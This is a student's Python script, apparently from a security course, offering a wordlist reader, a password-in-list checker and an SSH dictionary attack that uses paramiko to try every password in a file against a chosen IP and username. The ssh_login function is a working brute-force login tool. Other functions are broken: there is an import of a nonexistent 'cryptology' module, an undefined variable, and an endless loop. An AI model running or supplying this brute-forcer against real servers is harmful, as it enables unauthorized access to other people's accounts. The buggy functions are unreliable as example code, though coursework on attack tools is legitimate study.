#!/usr/bin/env python3

# Script Name:               Brute Force tool
# Author:                    Gerald
# Date of latest revision:   8/1/2023
# Purpose:                   looks through files for users and passwords to use to brute force
# Instructions:
#Authenticate to an SSH server by its IP address.
#Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

# Sources:
# https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/#


# Imported Libraries:
import time 
import paramiko
import cryptology
from getpass import getpass
import zipfile

# Varibles:
#File_Path = input("Input file path for Dictionary attack: ")


# Functions:
# The below funciton does not work for some reason and couldnt figure out why
# THe other brute force function is the one marco did in class
def Brute_ForceOld():
    File_Path = input("Input file path for Dictionary attack: ")
    with open(File_Path, "r") as file:
        line = file.readline()  # Read the first line
        while line:
            word = line.rstrip()
            print(word)
            sleep(1)
            line = file.readline()

def Brute_Force():
    File_Path = input("Input a file path for dictionary attack: ")
    # opens the file from the file path in read mode and stores as a variable
    file = open(File_Path, "r")
    # looks at the file (the file path) variable and reads lines from it
    line = file.readline()
    # while there is lines to read in the line variable (stops if there are no more lines)
    while line:
        # gets rid of any trailing characters like accidental spaces and saves as a variable
        line = line.rstrip()
        # saves line as the word variable. This seems unneccessary wouldnt print(line) work here just fine?
        print(line)
        # uses time library to sleep for one second
        time.sleep(1)
        # changes the line variable to read lines from the file. This will move on to the next line
        line = file.readline()
    # when there are no more lines to read closes the file
    file.close()

def Check_Password():
    File_Path = input("Input a file path to check for password: ")
    Password_to_check = input("Input a password to check: ")
    file = open(File_Path, "r")
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line

        if word == Password_to_check: 
            print("Change your password")
            break
        else:
            print("Your password is fine")
            time.sleep(1)

        line = file.readline()
    file.close()

# the code below is my attempt at making this, the other code is from ChatGPT 
def SSH_Brute_Forceme():
    host = input("Input a host to connect to: ")
    user = input("Input the username of the account to SSH into: ")
    port = input("Input the port to use with SSH: ")
    Path = input("Input file path to list of passwords")
    ssh = paramiko.SSHClient()
    paramiko.SSHClient().connect(host, port, user, password, timeout=3)
    file = open(Path, "r")
    line = file.readline()
    while line:
        line = line.rstrip()
        password_attempt = Path
        ssh.connect(host, port, user, password_attempt, timeout=3)

# This is from ChatGPT. The pseudo code is me breaking it down and saying what it does
# I never would have figured this out myself
# For some reason i cant tell why the script print out the entire file path thinking its a password and I dont know how to fix it
def ssh_login():
    # This variable lets you call the command provided by paramiko easier
    ip = input("Input a IP to SSH into: ")
    username = input("Input a username for SSH: ")
    password_list = input("Input filepath to password list: ")
    ssh = paramiko.SSHClient()
    file = open(password_list, "r")
    line = file.readline()
    # adds a policy if there is one missing?
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # For each password in the password list 
    for password in file:
        try:
            # uses the ssh variable to try the given IP, username, and password to login
            ssh.connect(ip, 22, username, password, timeout=3)  
            # the f means it will print the variables so its not hard coded
            print(f"Login successful! Username: {username}, Password: {password}")
            # not sure what this specific line does
        except paramiko.AuthenticationException:
            print(f"Login failed for Username: {username}, Password: {password}")
            continue
            # stores error or exception as a variable
        except paramiko.SSHException as e:
            # prints the error 
            print(f"Error occurred: {e}")
            break
            # same as above, not sure what the difference is though
        except Exception as e:
            print(f"Error: {e}")
            break
    else:
        print("Login unsuccessful. Password not found in the word list.")

    ssh.close()


# Main
menu = input("Press 1 to use a dictionary attack  \nPress 2 to check your password  \nPress 3 to SSH:  ")
if menu == "1":
    Brute_Force()
elif menu == "2": 
    Check_Password()
elif menu == "3":
    ssh_login()
else:
    print("Theres been an error") 
# /home/gerald/401-Code-Challenge/16-testfile
# 192.168.0.158
